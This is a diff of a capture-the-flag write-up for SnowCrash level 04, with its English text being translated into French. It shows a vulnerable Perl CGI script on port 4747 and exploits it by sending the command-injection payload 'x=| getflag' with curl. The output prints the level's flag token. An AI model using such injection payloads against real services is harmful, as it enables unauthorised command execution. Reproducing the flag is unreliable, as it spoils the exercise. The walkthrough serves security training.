@@ -1,13 +1,12 @@
-# Level 04
+# 04 - Perl exploit: entrée utilisateur
 
-- We login as user level04.
+- On se connecte en tant que level04.
 ```
 level04@SnowCrash:~$ ls -l
 total 4
 -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+level04@SnowCrash:~$ cat ./level04.pl
 ```
-
-- Let's `cat ./level04.pl`:
 ```perl
 #!/usr/bin/perl
 # localhost:4747
@@ -21,16 +20,16 @@ x(param("x"));
 ```
 
 
-- The script appears to be designed to be executed by a [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface) through a service listening on localhost through port 4747.
-It calls the `x()` function with the parameter `x` retrieved from the CGI. The function calls `echo` with the parameter it receives.
-Therefore, if the parameter `x` is `| getflag`, this script will then execute `echo | getflag`.
+- Le script semble être conçu pour être exécuté par un [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface) à travers un service écoutant en local sur le port 4747. Il appelle la fonction `x()` avec le paramètre `x` récupéré.
+
+- La fonction `x()` prépare l'instruction qui sera executée côté serveur en utilisant le paramètre `x` récupéré du CGI. Ainsi, le serveur va `echo <notre_input>`.
 ```
 level04@SnowCrash:~$ netstat -tuln | grep 4747
 tcp6       0      0 :::4747                 :::*                    LISTEN
 ```
 
 
-- There is indeed a service listening on all addresses through port 4747.
+- Il y a effectivement un service écoutant sur toutes les adresses par le port 4747.
 ```
 level04@SnowCrash:~$ curl -X POST -d "x=| getflag" http://localhost:4747
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
